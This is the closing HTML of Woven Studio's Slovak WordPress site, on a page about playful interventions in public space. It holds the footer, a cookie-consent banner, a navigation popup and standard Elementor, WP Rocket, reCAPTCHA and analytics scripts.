								<div class="elementor-element elementor-element-5c22b96 elementor-widget elementor-widget-text-editor" data-id="5c22b96" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<h2>Kontaktujte nás:</h2><p>studio@woven.sk</p><h2>Sledujte nás:</h2><p><a href="https://www.instagram.com/woven_studio/" target="_blank" rel="noopener">Instagram</a> <br /><a href="https://www.facebook.com/popletene" target="_blank" rel="noopener">Facebook</a></p>						</div>
				</div>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-b88fa82 copyrigt-section elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b88fa82" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-87c5a2c" data-id="87c5a2c" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-9929860 mb-0 elementor-widget elementor-widget-text-editor" data-id="9929860" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Copyright©Woven Studio 2022. All rights reserved.</p>						</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-b37c3ec" data-id="b37c3ec" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<section class="elementor-section elementor-inner-section elementor-element elementor-element-8df1976 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="8df1976" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-03a84ae elementor-hidden-tablet elementor-hidden-mobile" data-id="03a84ae" data-element_type="column">
			<div class="elementor-widget-wrap">
									</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-d8ce1aa contact-us-wrapper" data-id="d8ce1aa" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-2eb4379 elementor-widget elementor-widget-text-editor" data-id="2eb4379" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Webdesign by <a href="https://www.malinastudio.sk/" target="_blank" rel="noopener">Malina Studio</a></p>						</div>
				</div>
					</div>
		</div>
							</div>
		</section>
					</div>
		</div>
							</div>
		</section>
						</div>
		

<!-- Consent Management powered by Complianz | GDPR/CCPA Cookie Consent https://wordpress.org/plugins/complianz-gdpr -->
<div id="cmplz-cookiebanner-container"><div class="cmplz-cookiebanner cmplz-hidden banner-1 optin cmplz-bottom-right cmplz-categories-type-view-preferences" aria-modal="true" data-nosnippet="true" role="dialog" aria-live="polite" aria-labelledby="cmplz-header-1-optin" aria-describedby="cmplz-message-1-optin">
	<div class="cmplz-header">
		<div class="cmplz-logo"></div>
		<div class="cmplz-title" id="cmplz-header-1-optin">Spravujte súhlas so súbormi cookie</div>
		<div class="cmplz-close" tabindex="0" role="button" aria-label="close-dialog">
			<svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg>
		</div>
	</div>

	<div class="cmplz-divider cmplz-divider-header"></div>
	<div class="cmplz-body">
		<div class="cmplz-message" id="cmplz-message-1-optin"> Na poskytovanie tých najlepších skúseností používame technológie, ako sú súbory cookie na ukladanie a/alebo prístup k informáciám o zariadení. Súhlas s týmito technológiami nám umožní spracovávať údaje, ako je správanie pri prehliadaní alebo jedinečné ID na tejto stránke. Nesúhlas alebo odvolanie súhlasu môže nepriaznivo ovplyvniť určité vlastnosti a funkcie.</div>
		<!-- categories start -->
		<div class="cmplz-categories">
			<details class="cmplz-category cmplz-functional" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Funkčné</span>
							<span class='cmplz-always-active'>
								<span class="cmplz-banner-checkbox">
									<input type="checkbox"
										   id="cmplz-functional-optin"
										   data-category="cmplz_functional"
										   class="cmplz-consent-checkbox cmplz-functional"
										   size="40"
										   value="1"/>
									<label class="cmplz-label" for="cmplz-functional-optin" tabindex="0"><span class="screen-reader-text">Funkčné</span></label>
								</span>
								Vždy aktívny							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-functional"> Technické uloženie alebo prístup sú nevyhnutne potrebné na legitímny účel umožnenia použitia konkrétnej služby, ktorú si účastník alebo používateľ výslovne vyžiadal, alebo na jediný účel vykonania prenosu komunikácie cez elektronickú komunikačnú sieť.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-preferences" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Predvoľby</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-preferences-optin"
									   data-category="cmplz_preferences"
									   class="cmplz-consent-checkbox cmplz-preferences"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-preferences-optin" tabindex="0"><span class="screen-reader-text">Predvoľby</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-preferences">Technické uloženie alebo prístup je potrebný na legitímny účel ukladania preferencií, ktoré si účastník alebo používateľ nepožaduje.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-statistics" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Štatistiky</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-statistics-optin"
									   data-category="cmplz_statistics"
									   class="cmplz-consent-checkbox cmplz-statistics"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-statistics-optin" tabindex="0"><span class="screen-reader-text">Štatistiky</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-statistics">Technické úložisko alebo prístup, ktorý sa používa výlučne na štatistické účely.</span>
					<span class="cmplz-description-statistics-anonymous"> Technické úložisko alebo prístup, ktorý sa používa výlučne na anonymné štatistické účely. Bez predvolania, dobrovoľného plnenia zo strany vášho poskytovateľa internetových služieb alebo dodatočných záznamov od tretej strany, informácie uložené alebo získané len na tento účel sa zvyčajne nedajú použiť na vašu identifikáciu.</span>
				</div>
			</details>
			<details class="cmplz-category cmplz-marketing" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Marketing</span>
							<span class="cmplz-banner-checkbox">
								<input type="checkbox"
									   id="cmplz-marketing-optin"
									   data-category="cmplz_marketing"
									   class="cmplz-consent-checkbox cmplz-marketing"
									   size="40"
									   value="1"/>
								<label class="cmplz-label" for="cmplz-marketing-optin" tabindex="0"><span class="screen-reader-text">Marketing</span></label>
							</span>
							<span class="cmplz-icon cmplz-open">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"  height="18" ><path d="M224 416c-8.188 0-16.38-3.125-22.62-9.375l-192-192c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L224 338.8l169.4-169.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-192 192C240.4 412.9 232.2 416 224 416z"/></svg>
							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-marketing">Technické úložisko alebo prístup sú potrebné na vytvorenie používateľských profilov na odosielanie reklamy alebo sledovanie používateľa na webovej stránke alebo na viacerých webových stránkach na podobné marketingové účely.</span>
				</div>
			</details>
		</div><!-- categories end -->
			</div>

	<div class="cmplz-links cmplz-information">
		<a class="cmplz-link cmplz-manage-options cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">Spravovať možnosti</a>
		<a class="cmplz-link cmplz-manage-third-parties cookie-statement" href="#" data-relative_url="#cmplz-cookies-overview">Správa služieb</a>
		<a class="cmplz-link cmplz-manage-vendors tcf cookie-statement" href="#" data-relative_url="#cmplz-tcf-wrapper">Správa {vendor_count} predajcov</a>
		<a class="cmplz-link cmplz-external cmplz-read-more-purposes tcf" target="_blank" rel="noopener noreferrer nofollow" href="https://cookiedatabase.org/tcf/purposes/">Prečítajte si viac o týchto účeloch</a>
			</div>

	<div class="cmplz-divider cmplz-footer"></div>

	<div class="cmplz-buttons">
		<button class="cmplz-btn cmplz-accept">Prijať</button>
		<button class="cmplz-btn cmplz-deny">Odmietnuť</button>
		<button class="cmplz-btn cmplz-view-preferences">Zobraziť predvoľby</button>
		<button class="cmplz-btn cmplz-save-preferences"> Uložiť predvoľby</button>
		<a class="cmplz-btn cmplz-manage-options tcf cookie-statement" href="#" data-relative_url="#cmplz-manage-consent-container">Zobraziť predvoľby</a>
			</div>

	<div class="cmplz-links cmplz-documents">
		<a class="cmplz-link cookie-statement" href="#" data-relative_url="">{title}</a>
		<a class="cmplz-link privacy-statement" href="#" data-relative_url="">{title}</a>
		<a class="cmplz-link impressum" href="#" data-relative_url="">{title}</a>
			</div>

</div>
</div>
					<div id="cmplz-manage-consent" data-nosnippet="true"><button class="cmplz-btn cmplz-hidden cmplz-manage-consent manage-consent-1">Spravovať súhlas</button>

</div>		<div data-elementor-type="popup" data-elementor-id="249" class="elementor elementor-249 elementor-location-popup" data-elementor-settings="{&quot;entrance_animation&quot;:&quot;fadeInLeft&quot;,&quot;exit_animation&quot;:&quot;fadeInLeft&quot;,&quot;entrance_animation_duration&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.1999999999999999555910790149937383830547332763671875,&quot;sizes&quot;:[]},&quot;a11y_navigation&quot;:&quot;yes&quot;,&quot;timing&quot;:[]}" data-elementor-post-type="elementor_library">
								<section class="elementor-section elementor-top-section elementor-element elementor-element-7fd2021 elementor-section-height-min-height elementor-section-items-stretch elementor-section-boxed elementor-section-height-default" data-id="7fd2021" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-4e5c15f" data-id="4e5c15f" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
								<div class="elementor-element elementor-element-43feea0 elementor-widget__width-auto elementor-widget elementor-widget-image" data-id="43feea0" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
															<img width="213" height="48" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20213%2048'%3E%3C/svg%3E" class="attachment-large size-large wp-image-72" alt="" data-lazy-src="https://woven.sk/wp-content/uploads/2023/03/woven_logo_white.svg" /><noscript><img width="213" height="48" src="https://woven.sk/wp-content/uploads/2023/03/woven_logo_white.svg" class="attachment-large size-large wp-image-72" alt="" /></noscript>															</div>
				</div>
				<div class="elementor-element elementor-element-48e2d12 elementor-widget__width-auto elementor-absolute elementor-view-default elementor-widget elementor-widget-icon" data-id="48e2d12" data-element_type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;}" data-widget_type="icon.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-wrapper">
			<a class="elementor-icon" href="#elementor-action%3Aaction%3Dpopup%3Aclose%26settings%3DeyJkb19ub3Rfc2hvd19hZ2FpbiI6IiJ9">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"><line x1="1.29289" y1="22.2929" x2="22.5061" y2="1.07969" stroke="white" stroke-width="2"></line><line x1="1.70711" y1="1.29289" x2="22.9203" y2="22.5061" stroke="white" stroke-width="2"></line></svg>			</a>
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b6185b9 elementor-nav-menu__align-left elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu" data-id="b6185b9" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;vertical&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;i class=\&quot;fas fa-caret-down\&quot;&gt;&lt;\/i&gt;&quot;,&quot;library&quot;:&quot;fa-solid&quot;}}" data-widget_type="nav-menu.default">
				<div class="elementor-widget-container">
			<link rel="stylesheet" href="https://woven.sk/wp-content/uploads/elementor/css/custom-pro-widget-nav-menu.min.css?ver=1700743349">			<nav class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-underline e--animation-fade">
				<ul id="menu-1-b6185b9" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1266"><a href="https://woven.sk/sk/studio/" class="elementor-item">Štúdio</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1267"><a href="https://woven.sk/sk/projekty/" class="elementor-item">Projekty</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1553"><a href="https://woven.sk/sk/produkty/" class="elementor-item">Produkty</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1268"><a href="https://woven.sk/sk/workshop-11/" class="elementor-item">Workshop [1:1]</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1269"><a href="https://woven.sk/sk/kontakt/" class="elementor-item">Kontakt</a></li>
</ul>			</nav>
						<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
				<ul id="menu-2-b6185b9" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1266"><a href="https://woven.sk/sk/studio/" class="elementor-item" tabindex="-1">Štúdio</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1267"><a href="https://woven.sk/sk/projekty/" class="elementor-item" tabindex="-1">Projekty</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1553"><a href="https://woven.sk/sk/produkty/" class="elementor-item" tabindex="-1">Produkty</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1268"><a href="https://woven.sk/sk/workshop-11/" class="elementor-item" tabindex="-1">Workshop [1:1]</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1269"><a href="https://woven.sk/sk/kontakt/" class="elementor-item" tabindex="-1">Kontakt</a></li>
</ul>			</nav>
				</div>
				</div>
					</div>
		</div>
							</div>
		</section>
						</div>
		<link rel='stylesheet' id='elementor-post-1717-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-1717.css?ver=1701952939' media='all' />
<link rel='stylesheet' id='elementor-post-1721-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-1721.css?ver=1700743878' media='all' />
<link rel='stylesheet' id='elementor-post-249-css' href='https://woven.sk/wp-content/uploads/elementor/css/post-249.css?ver=1700743349' media='all' />
<link rel='stylesheet' id='e-animations-css' href='https://woven.sk/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=3.17.3' media='all' />
<link rel='stylesheet' id='elementor-icons-shared-0-css' href='https://woven.sk/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' media='all' />
<link data-minify="1" rel='stylesheet' id='elementor-icons-fa-solid-css' href='https://woven.sk/wp-content/cache/min/1/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=1701895374' media='all' />

<script id="contact-form-7-js-extra">
var wpcf7 = {"api":{"root":"https:\/\/woven.sk\/sk\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
</script>

<script id="rocket_lazyload_css-js-extra">
var rocket_lazyload_css_data = {"threshold":"300"};
</script>
<script id="rocket_lazyload_css-js-after">
!function o(n,c,a){function s(t,e){if(!c[t]){if(!n[t]){var r="function"==typeof require&&require;if(!e&&r)return r(t,!0);if(u)return u(t,!0);throw(r=new Error("Cannot find module '"+t+"'")).code="MODULE_NOT_FOUND",r}r=c[t]={exports:{}},n[t][0].call(r.exports,function(e){return s(n[t][1][e]||e)},r,r.exports,o,n,c,a)}return c[t].exports}for(var u="function"==typeof require&&require,e=0;e<a.length;e++)s(a[e]);return s}({1:[function(e,t,r){"use strict";!function(){const r="undefined"==typeof rocket_pairs?[]:rocket_pairs,e="undefined"==typeof rocket_excluded_pairs?[]:rocket_excluded_pairs;e.map(t=>{var e=t.selector;const r=document.querySelectorAll(e);r.forEach(e=>{e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"excluded")})});const o=document.querySelector("#wpr-lazyload-bg");var t=rocket_lazyload_css_data.threshold||300;const n=new IntersectionObserver(e=>{e.forEach(t=>{if(t.isIntersecting){const e=r.filter(e=>t.target.matches(e.selector));e.map(t=>{t&&(o.innerHTML+=t.style,t.elements.forEach(e=>{n.unobserve(e),e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"loaded")}))})}})},{rootMargin:t+"px"});function c(){0<(0<arguments.length&&void 0!==arguments[0]?arguments[0]:[]).length&&r.forEach(t=>{try{const e=document.querySelectorAll(t.selector);e.forEach(e=>{"loaded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&"excluded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&(n.observe(e),(t.elements||(t.elements=[])).push(e))})}catch(e){console.error(e)}})}c();const a=function(){const o=window.MutationObserver;return function(e,t){if(e&&1===e.nodeType){const r=new o(t);return r.observe(e,{attributes:!0,childList:!0,subtree:!0}),r}}}();t=document.querySelector("body"),a(t,c)}()},{}]},{},[1]);
</script>

<script src="https://www.google.com/recaptcha/api.js?render=6Lcwk3snAAAAACuqBMc1_fuWpw2JaXhP6UcfAsWl&amp;ver=3.0" id="google-recaptcha-js"></script>


<script src="https://woven.sk/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script id="wpcf7-recaptcha-js-extra">
var wpcf7_recaptcha = {"sitekey":"6Lcwk3snAAAAACuqBMc1_fuWpw2JaXhP6UcfAsWl","actions":{"homepage":"homepage","contactform":"contactform"}};
</script>

<script id="cmplz-cookiebanner-js-extra">
var complianz = {"prefix":"cmplz_","user_banner_id":"1","set_cookies":[],"block_ajax_content":"","banner_version":"13","version":"6.5.6","store_consent":"","do_not_track_enabled":"","consenttype":"optin","region":"eu","geoip":"","dismiss_timeout":"","disable_cookiebanner":"","soft_cookiewall":"","dismiss_on_scroll":"","cookie_expiry":"365","url":"https:\/\/woven.sk\/sk\/wp-json\/complianz\/v1\/","locale":"lang=sk&locale=sk_SK","set_cookies_on_root":"","cookie_domain":"","current_policy_id":"17","cookie_path":"\/","categories":{"statistics":"\u0161tatistiky","marketing":"marketing"},"tcf_active":"","placeholdertext":"Kliknut\u00edm prijmete s\u00fabory cookie {category} a povol\u00edte tento obsah","aria_label":"Kliknut\u00edm prijmete s\u00fabory cookie {category} a povol\u00edte tento obsah","css_file":"https:\/\/woven.sk\/wp-content\/uploads\/complianz\/css\/banner-{banner_id}-{type}.css?v=13","page_links":{"eu":{"cookie-statement":{"title":"Politika s\u00faborov cookies","url":"https:\/\/woven.sk\/sk\/politika-suborov-cookies\/"},"privacy-statement":{"title":"Ochrana osobn\u00fdch \u00fadajov","url":"https:\/\/woven.sk\/sk\/ochrana-sukromia\/"}}},"tm_categories":"","forceEnableStats":"1","preview":"","clean_cookies":""};
</script>






<script src="https://woven.sk/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1" id="wp-hooks-js"></script>
<script src="https://woven.sk/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef" id="wp-i18n-js"></script>

<script id="elementor-pro-frontend-js-before">
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/woven.sk\/wp-admin\/admin-ajax.php","nonce":"cb55d0ebf7","urls":{"assets":"https:\/\/woven.sk\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/woven.sk\/sk\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},
"facebook_sdk":{"lang":"sk_SK","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/woven.sk\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
</script>



<script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Zdie\u013ea\u0165 na Facebooku","shareOnTwitter":"Zdie\u013ea\u0165 na Twitteri","pinIt":"Pripn\u00fa\u0165","download":"Stiahnu\u0165","downloadImage":"Stiahnu\u0165 obr\u00e1zok","fullscreen":"Na cel\u00fa obrazovku","zoom":"Pribl\u00ed\u017eenie","share":"Zdie\u013ea\u0165","playVideo":"Prehra\u0165 video","previous":"Predo\u0161l\u00e9","next":"\u010eal\u0161ie","close":"Zatvori\u0165","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1330,"default_value":1200,"direction":"max","is_enabled":true},"laptop":{"label":"Notebook","value":1660,"default_value":1366,"direction":"max","is_enabled":true},"widescreen":{"label":"\u0160irokouhl\u00e1 obrazovka","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},
"version":"3.17.3","is_static":false,"experimentalFeatures":{"e_dom_optimization":true,"e_optimized_assets_loading":true,"e_optimized_css_loading":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"landing-pages":true,"nested-elements":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/woven.sk\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper-container","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet","viewport_tablet_extra","viewport_laptop"],"viewport_laptop":1660,"viewport_tablet_extra":1330,"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":1077,"title":"Hrav%C3%A9%20z%C3%A1sahy%20do%20prostredia%20a%20intervencie%20do%20verejn%C3%A9ho%20priestoru%20%7C%20woven","excerpt":"","featuredImage":false}};
</script>



				<script async data-category="functional" src="https://www.googletagmanager.com/gtag/js?id=G-LTF898DY3Y"></script><!-- Statistics script Complianz GDPR/CCPA -->
						<script  data-category="functional">window['gtag_enable_tcf_support'] = false;
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-LTF898DY3Y', {
	cookie_flags:'secure;samesite=none',
	
});
</script><script>window.lazyLoadOptions=[{elements_selector:"img[data-lazy-src],.rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}},{elements_selector:".rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,}];window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://woven.sk/wp-content/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.min.js"></script>
<script src="https://woven.sk/wp-content/cache/min/1/d76c78ba241fd7f639a4a4b1a6b6f3a6.js" data-minify="1" defer></script></body>
</html>

<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me - Debug: cached@1743025556 -->